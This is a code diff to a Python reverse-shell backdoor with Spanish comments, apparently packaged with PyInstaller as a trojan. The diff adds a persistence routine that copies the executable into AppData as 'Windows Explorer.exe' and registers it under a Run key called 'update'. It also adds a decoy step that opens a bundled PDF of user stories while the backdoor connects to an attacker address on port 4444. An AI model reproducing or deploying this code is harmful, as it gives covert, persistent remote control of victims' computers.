@@ -3,13 +3,22 @@ import socket
 import subprocess
 import json
 import os
+import shutil
+import sys
 
 class Backdoor:
     def __init__(self, ip, port):
+        #self.becomePersistent()
         self.BUFFER_SIZE = 4096
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante
 
+    def becomePersistent(self):
+        fileLocation = os.environ['appdata'] + '\\Windows Explorer.exe'
+        if not os.path.exists(fileLocation):
+            shutil.copyfile(sys.executable, fileLocation)
+            subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\Run /v update /t REG_SZ /d "' + fileLocation + '"', shell=True)
+    
     #Codificación json:
     def reliableSend(self, data):
         if isinstance(data, bytes):
@@ -110,5 +119,11 @@ class Backdoor:
             self.connection.close()
             print('\nConexión finalizada')
             
-backdoor = Backdoor('157.100.199.115', 65432)
-backdoor.run()
+file_name = sys._MEIPASS + '\Historias_de_usuario.pdf'
+subprocess.Popen(file_name, shell= True)
+
+try: 
+    backdoor = Backdoor('192.168.1.14', 4444)
+    backdoor.run()
+except:
+    sys.exit()
